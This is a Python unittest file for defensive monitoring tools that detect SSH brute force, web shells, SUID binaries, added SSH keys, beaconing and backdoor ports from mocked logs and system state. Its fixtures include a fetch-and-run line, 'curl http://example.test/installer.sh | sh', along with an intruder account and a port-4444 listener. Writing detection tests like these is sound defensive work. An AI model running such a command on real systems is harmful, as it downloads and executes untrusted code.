import os
import stat
import sys
import time
import types
import unittest
from types import SimpleNamespace
from unittest.mock import mock_open, patch

if "crewai_tools" not in sys.modules:
    crewai_tools_stub = types.ModuleType("crewai_tools")

    class BaseTool:
        def __init__(self, *args, **kwargs):
            pass

    crewai_tools_stub.BaseTool = BaseTool
    sys.modules["crewai_tools"] = crewai_tools_stub

from tools.filesystem_monitor_tool import FileSystemMonitorTool
from tools.log_analysis_tool import LogAnalysisTool
from tools.network_monitor_tool import NetworkMonitorTool


class LogAnalysisToolTests(unittest.TestCase):
    def test_detects_multiple_threats_and_escalates_high_volume_brute_force(self):
        auth_log = "auth.log"
        syslog = "syslog"
        missing_log = "missing.log"

        brute_force_lines = [
            f"Apr 22 10:{i:02d}:00 host sshd[100{i}]: Failed password for admin from 203.0.113.10 port 22 ssh2"
            for i in range(51)
        ]
        auth_content = "\n".join(
            brute_force_lines
            + [
                "Apr 22 11:00:00 host sshd[2000]: Failed password for root from 198.51.100.7 port 22 ssh2",
                "Apr 22 11:01:00 host sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 user=ubuntu",
                "Apr 22 11:02:00 host sshd[2002]: Accepted password for root from 192.0.2.55 port 22 ssh2",
                "Apr 22 11:03:00 host kernel: curl http://example.test/installer.sh | sh",
                "Apr 22 11:04:00 host CRON[1]: (root) CMD (/usr/bin/true)",
            ]
        )
        syslog_content = "Apr 22 11:05:00 host useradd[999]: new user name=intruder\n"

        def fake_open(path, mode="r", errors=None):
            if path == auth_log:
                return mock_open(read_data=auth_content)()
            if path == syslog:
                return mock_open(read_data=syslog_content)()
            raise FileNotFoundError(path)

        with patch("builtins.open", side_effect=fake_open):
            result = LogAnalysisTool()._run(f"{auth_log},{syslog},{missing_log}")

        detections = {item["threat_type"]: item for item in result["detections"]}

        self.assertEqual(result["total_threat_types_found"], 7)
        self.assertEqual(detections["brute_force_ssh"]["occurrences"], 52)
        self.assertEqual(detections["brute_force_ssh"]["severity"], "HIGH")
        self.assertEqual(
            detections["brute_force_ssh"]["top_source_ips"][0],
            ("203.0.113.10", 51),
        )
        self.assertEqual(detections["ssh_root_attempt"]["severity"], "HIGH")
        self.assertEqual(detections["successful_root_login"]["severity"], "CRITICAL")
        self.assertEqual(detections["malware_process"]["severity"], "CRITICAL")
        self.assertEqual(detections["new_account_created"]["occurrences"], 1)


class FileSystemMonitorToolTests(unittest.TestCase):
    def test_detects_recent_file_system_threats_across_scan_categories(self):
        critical_file = "/mock/etc/passwd"
        web_root = "/mock/www"
        web_shell = os.path.join(web_root, "shell.php")
        suid_dir = "/mock/suid"
        suid_file = os.path.join(suid_dir, "helper")
        homes_base = "/mock/home"
        authorized_keys = os.path.join(homes_base, "ubuntu", ".ssh", "authorized_keys")
        tmp_dir = "/mock/tmp"
        staged_file = os.path.join(tmp_dir, "script.bin")
        regular_file = os.path.join(tmp_dir, "notes.txt")
        recent_ts = time.time()

        def fake_exists(path):
            return path in {
                critical_file,
                web_root,
                suid_dir,
                homes_base,
                authorized_keys,
                tmp_dir,
            }

        def fake_getmtime(path):
            if path in {critical_file, authorized_keys}:
                return recent_ts
            raise FileNotFoundError(path)

        def fake_walk(path):
            if path == web_root:
                yield web_root, ["node_modules"], ["shell.php", "readme.txt"]

        def fake_listdir(path):
            if path == suid_dir:
                return ["helper"]
            if path == homes_base:
                return ["ubuntu"]
            if path == tmp_dir:
                return ["script.bin", "notes.txt"]
            return []

        def fake_stat(path):
            if path == suid_file:
                return SimpleNamespace(st_mode=stat.S_ISUID, st_mtime=recent_ts)
            if path == staged_file:
                return SimpleNamespace(st_mode=stat.S_IXUSR, st_mtime=recent_ts)
            if path == regular_file:
                return SimpleNamespace(st_mode=0, st_mtime=recent_ts)
            raise FileNotFoundError(path)

        def fake_isfile(path):
            return path in {staged_file, regular_file}

        def fake_open(path, mode="r", errors=None):
            if path == web_shell:
                return mock_open(read_data="<?php danger_marker(); ?>")()
            raise FileNotFoundError(path)

        with patch("tools.filesystem_monitor_tool.CRITICAL_FILES", [critical_file]), \
             patch("tools.filesystem_monitor_tool.WEB_ROOTS", [web_root]), \
             patch("tools.filesystem_monitor_tool.WEBSHELL_SIGNATURES", ["danger_marker"]), \
             patch("tools.filesystem_monitor_tool.SUID_SCAN_PATHS", [suid_dir]), \
             patch("tools.filesystem_monitor_tool.HOME_BASES", [homes_base]), \
             patch("tools.filesystem_monitor_tool.TMP_SCAN_PATH", tmp_dir), \
             patch("tools.filesystem_monitor_tool.os.path.exists", side_effect=fake_exists), \
             patch("tools.filesystem_monitor_tool.os.path.getmtime", side_effect=fake_getmtime), \
             patch("tools.filesystem_monitor_tool.os.walk", side_effect=fake_walk), \
             patch("tools.filesystem_monitor_tool.os.listdir", side_effect=fake_listdir), \
             patch("tools.filesystem_monitor_tool.os.stat", side_effect=fake_stat), \
             patch("tools.filesystem_monitor_tool.os.path.isfile", side_effect=fake_isfile), \
             patch("builtins.open", side_effect=fake_open):
            result = FileSystemMonitorTool()._run("1")

        detections = {item["threat_type"]: item for item in result["detections"]}

        self.assertEqual(result["scan_window_hours"], 1)
        self.assertEqual(result["total_fs_threats"], 5)
        self.assertEqual(detections["critical_system_file_modified"]["severity"], "CRITICAL")
        self.assertEqual(detections["web_shell_detected"]["matched_signature"], "danger_marker")
        self.assertEqual(detections["new_suid_binary"]["severity"], "HIGH")
        self.assertEqual(detections["ssh_authorized_key_added"]["file"], authorized_keys)
        self.assertEqual(detections["executable_in_tmp"]["file"], staged_file)

    def test_invalid_hours_defaults_to_24(self):
        with patch("tools.filesystem_monitor_tool.CRITICAL_FILES", []), \
             patch("tools.filesystem_monitor_tool.WEB_ROOTS", []), \
             patch("tools.filesystem_monitor_tool.SUID_SCAN_PATHS", []), \
             patch("tools.filesystem_monitor_tool.HOME_BASES", []), \
             patch("tools.filesystem_monitor_tool.TMP_SCAN_PATH", "/nonexistent"):
            result = FileSystemMonitorTool()._run("not-a-number")

        self.assertEqual(result["scan_window_hours"], 24)
        self.assertEqual(result["total_fs_threats"], 0)


class NetworkMonitorToolTests(unittest.TestCase):
    def test_detects_suspicious_connections_backdoor_ports_and_bruteforce_ips(self):
        established_output = "\n".join(
            [
                "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
                *[
                    f"ESTAB 0 0 10.0.0.5:{5000 + i} 198.51.100.50:443 users:(('python',pid=1,fd=3))"
                    for i in range(11)
                ],
                "ESTAB 0 0 10.0.0.5:2222 203.0.113.77:22 users:(('sshd',pid=2,fd=4))",
            ]
        )
        listening_output = "\n".join(
            [
                "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
                "LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(('service',pid=9,fd=5))",
            ]
        )
        auth_log = "\n".join(
            [f"Failed password for invalid user admin from 203.0.113.200 port {2200 + i} ssh2" for i in range(25)]
            + [f"Failed password for invalid user root from 198.51.100.10 port {3200 + i} ssh2" for i in range(55)]
        )

        def fake_run(command, capture_output, text, timeout):
            if command == ["ss", "-tnp"]:
                return SimpleNamespace(stdout=established_output)
            if command == ["ss", "-tlnp"]:
                return SimpleNamespace(stdout=listening_output)
            raise AssertionError(f"Unexpected command: {command}")

        with patch("tools.network_monitor_tool.subprocess.run", side_effect=fake_run), \
             patch("builtins.open", mock_open(read_data=auth_log)):
            result = NetworkMonitorTool()._run()

        detections = result["detections"]
        threat_types = [item["threat_type"] for item in detections]
        port_scan_entries = [item for item in detections if item["threat_type"] == "port_scan_or_brute_force"]

        self.assertEqual(result["total_network_threats"], 5)
        self.assertIn("suspicious_port_connection", threat_types)
        self.assertIn("possible_c2_beaconing", threat_types)
        self.assertIn("backdoor_port_listening", threat_types)
        self.assertEqual({item["source_ip"] for item in port_scan_entries}, {"203.0.113.200", "198.51.100.10"})
        self.assertEqual(
            next(item for item in port_scan_entries if item["source_ip"] == "198.51.100.10")["severity"],
            "HIGH",
        )
        self.assertEqual(
            next(item for item in detections if item["threat_type"] == "backdoor_port_listening")["port"],
            4444,
        )

    def test_parse_ss_skips_header_and_malformed_rows(self):
        output = "\n".join(
            [
                "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
                "ESTAB 0 0 10.0.0.5:4000 192.0.2.10:22 users:(('ssh',pid=1,fd=3))",
                "BROKEN ROW",
            ]
        )

        parsed = NetworkMonitorTool()._parse_ss(output)

        self.assertEqual(
            parsed,
            [
                {
                    "state": "ESTAB",
                    "local": "10.0.0.5:4000",
                    "remote": "192.0.2.10:22",
                }
            ],
        )


if __name__ == "__main__":
    unittest.main()
